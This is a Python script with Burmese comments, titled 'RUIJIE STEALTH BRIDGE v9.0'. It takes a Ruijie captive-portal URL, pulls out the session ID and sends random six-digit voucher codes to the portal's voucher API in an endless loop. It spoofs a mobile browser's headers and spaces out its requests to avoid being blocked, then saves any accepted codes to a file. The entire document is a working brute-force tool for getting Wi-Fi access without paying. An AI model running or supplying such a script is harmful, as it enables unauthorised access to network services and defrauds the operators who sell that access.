import requests
import random
import time
import re
import os
from urllib.parse import urlparse

# --- [ SETTINGS ] ---
# Browser အစစ်ဖြစ်ကြောင်း ဟန်ဆောင်ထားသော Headers
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://portal-as.ruijienetworks.com",
    "Connection": "keep-alive"
}

def clear(): os.system('clear')

def scan():
    clear()
    print("--- RUIJIE STEALTH BRIDGE v9.0 ---")
    portal_url = input("[?] Paste Portal URL: ").strip()
    
    try:
        sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', portal_url).group(1)
        parsed = urlparse(portal_url)
        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
    except:
        print("[!] URL မှားနေပါတယ်ဗျ။ Portal Link အပြည့်အစုံ ပြန်ထည့်ပါ။")
        return

    print(f"\n[*] Target: {api_url}")
    print("[*] Status: Searching for valid codes...\n")

    while True:
        # Ruijie အများစုသုံးသော ဂဏန်း ၆ လုံးကို ဦးစားပေးစစ်ပါ
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        
        try:
            # POST request ပို့ခြင်း
            res = requests.post(api_url, 
                                json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, 
                                headers=HEADERS, 
                                timeout=10)
            
            # ၂၀၀ ပြန်လာလျှင် စနစ်က လက်ခံသော ကုဒ်ဖြစ်သည်
            if res.status_code == 200:
                print(f"\n{'-'*30}")
                print(f"[✅] POTENTIAL CODE FOUND: {code}")
                print(f"[!] Browser မှာ အခုချက်ချင်း ရိုက်ထည့်ကြည့်ပါ!")
                print(f"{'-'*30}\n")
                
                # ကုဒ်ကို ဖိုင်ထဲသိမ်းထားမည်
                with open("found_hits.txt", "a") as f:
                    f.write(f"CODE: {code} | TIME: {time.ctime()}\n")
                
                # ကုဒ်တစ်ခုတွေ့လျှင် ၅ စက္ကန့်ရပ်မည် (အစ်ကို Browser မှာ ရိုက်ထည့်နိုင်ရန်)
                time.sleep(5) 
            else:
                print(f"[*] Testing: {code} [Invalid]", end="\r")

            # Block မခံရစေရန် လူကိုယ်တိုင်ရိုက်သလို ၂ စက္ကန့် ခြားစစ်မည်
            time.sleep(2)

        except KeyboardInterrupt:
            print("\n[!] Stopped.")
            break
        except:
            time.sleep(5)

if __name__ == "__main__":
    scan()
